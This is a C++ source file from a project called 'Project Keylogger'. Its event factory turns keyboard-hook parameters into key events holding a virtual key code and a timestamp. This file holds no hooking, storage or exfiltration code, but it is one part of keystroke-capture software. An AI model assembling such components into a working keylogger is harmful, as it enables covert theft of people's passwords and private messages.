/**
 * Project Keylogger
 */


#include "keylogger_dll/EventFactory.h"

/**
 * EventFactory implementation
 */

/** Constructor of EventFactory
 *
 */
EventFactory::EventFactory() {
}

/**
 * Function to create an Event with LPARAM and WPARAM
 * @param LPARAM lparam from hook
 * @param WPARAM wparam from hook
 * @return AEvent* the event created
 */
const AEvent* EventFactory::create(LPARAM lparam, WPARAM wparam, t_Context context) {
	std::chrono::time_point<std::chrono::system_clock> time;
	time = std::chrono::system_clock::now();
		
	std::chrono::milliseconds ms = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch());
	int vkKeyCode = wparam;
	int repeatCount = 0;
	int scanCode = 0;
	bool extend = 0;
	bool alt = 0;
	bool prevKeyState = 0;
	bool transState = 0;
    return new AEvent(vkKeyCode, repeatCount, scanCode, extend, alt, prevKeyState, transState, ms, context);
}